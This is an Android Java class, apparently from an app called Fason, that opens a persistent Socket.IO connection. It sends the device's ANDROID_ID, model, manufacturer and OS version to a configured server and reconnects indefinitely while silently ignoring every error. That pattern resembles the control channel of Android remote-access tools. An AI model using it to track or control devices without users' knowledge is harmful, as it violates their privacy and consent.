package com.fason.app.core.network;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;

import com.fason.app.core.FasonApp;
import com.fason.app.core.config.Config;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

import io.socket.client.IO;
import io.socket.client.Socket;

public class SocketClient {

    private static final SocketClient INSTANCE = new SocketClient();
    private static final int RECONNECT_BASE_DELAY = 5000;
    private static final int MAX_RECONNECT_DELAY = 60000;

    private Socket socket;
    private ConnectivityManager.NetworkCallback networkCallback;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private int reconnectAttempts = 0;
    private boolean manualDisconnect = false;

    private SocketClient() {
        init();
        setupNetworkMonitor();
    }

    private synchronized void init() {
        try {
            String deviceId = Settings.Secure.getString(
                FasonApp.getContext().getContentResolver(), Settings.Secure.ANDROID_ID);
            if (deviceId == null) deviceId = "unknown";

            String query = String.format("model=%s&manf=%s&release=%s&id=%s",
                encode(android.os.Build.MODEL),
                encode(android.os.Build.MANUFACTURER),
                encode(android.os.Build.VERSION.RELEASE),
                encode(deviceId));

            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionAttempts = Integer.MAX_VALUE;
            opts.reconnectionDelay = RECONNECT_BASE_DELAY;
            opts.reconnectionDelayMax = MAX_RECONNECT_DELAY;
            opts.timeout = 30000;
            opts.query = query;
            opts.secure = Config.isHttps();

            socket = IO.socket(Config.getServerUrl(), opts);

            // Handle reconnection events
            socket.on(Socket.EVENT_CONNECT, args -> {
                reconnectAttempts = 0;
                manualDisconnect = false;
            });

            socket.on(Socket.EVENT_DISCONNECT, args -> {
                if (!manualDisconnect) {
                    scheduleReconnect();
                }
            });

            socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
                scheduleReconnect();
            });

        } catch (Exception ignored) {}
    }

    private void setupNetworkMonitor() {
        ConnectivityManager cm = (ConnectivityManager) FasonApp.getContext()
            .getSystemService(Context.CONNECTIVITY_SERVICE);

        if (cm == null) return;

        NetworkRequest req = new NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build();

        networkCallback = new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(Network network) {
                // Network available, try to connect
                if (socket != null && !socket.connected()) {
                    handler.postDelayed(() -> {
                        try { socket.connect(); } catch (Exception ignored) {}
                    }, 1000);
                }
            }

            @Override
            public void onLost(Network network) {
                // Network lost, socket will handle disconnect
            }
        };

        try {
            cm.registerNetworkCallback(req, networkCallback);
        } catch (Exception ignored) {}
    }

    private void scheduleReconnect() {
        if (manualDisconnect) return;

        reconnectAttempts++;
        long delay = Math.min(RECONNECT_BASE_DELAY * (long) Math.pow(1.5, Math.min(reconnectAttempts, 10)), MAX_RECONNECT_DELAY);

        handler.postDelayed(() -> {
            if (socket != null && !socket.connected() && !manualDisconnect) {
                try { socket.connect(); } catch (Exception ignored) {}
            }
        }, delay);
    }

    private String encode(String s) {
        try {
            return URLEncoder.encode(s != null ? s : "", "UTF-8");
        } catch (UnsupportedEncodingException e) {
            return s != null ? s : "";
        }
    }

    public static SocketClient getInstance() { return INSTANCE; }

    public synchronized Socket getSocket() {
        if (socket == null) init();
        return socket;
    }

    public void reconnect() {
        manualDisconnect = false;
        if (socket != null) {
            try { socket.connect(); } catch (Exception ignored) {}
        }
    }

    public void disconnect() {
        manualDisconnect = true;
        if (socket != null) {
            try { socket.disconnect(); } catch (Exception ignored) {}
        }
    }
}
